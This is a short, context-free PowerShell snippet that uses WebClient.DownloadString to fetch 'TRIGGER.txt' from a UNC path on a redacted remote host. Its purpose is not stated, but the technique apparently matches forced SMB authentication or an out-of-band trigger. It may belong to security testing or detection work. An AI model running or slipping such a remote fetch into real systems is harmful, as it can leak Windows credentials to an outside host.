$webclient = New-Object System.Net.WebClient;
$uri = "\\##REDACTED##\TRIGGER.txt";
$webclient.DownloadString($uri);